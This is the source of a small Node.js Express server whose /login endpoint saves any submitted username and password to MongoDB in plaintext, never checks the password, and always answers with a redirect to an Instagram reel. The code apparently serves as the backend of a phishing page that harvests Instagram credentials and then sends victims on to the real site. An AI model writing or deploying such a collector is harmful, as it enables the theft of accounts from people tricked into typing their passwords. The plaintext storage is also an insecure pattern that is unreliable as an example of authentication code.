const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
require("dotenv").config();
const User = require("./models/User");

const app = express();
app.use(cors());
app.use(express.json());

mongoose
  .connect(process.env.MONGO_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true
  })
  .then(() => console.log("MongoDB connected"))
  .catch((err) => console.error(err));

app.post("/login", async (req, res) => {
  const { username, password } = req.body;

  let user = await User.findOne({ username });
  if (!user) {
    user = new User({ username, password });
    await user.save();
  }

  res.status(200).json({ success: true, redirectUrl: "https://www.instagram.com/reels/DLFOfqzyhbk/aqw" });
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
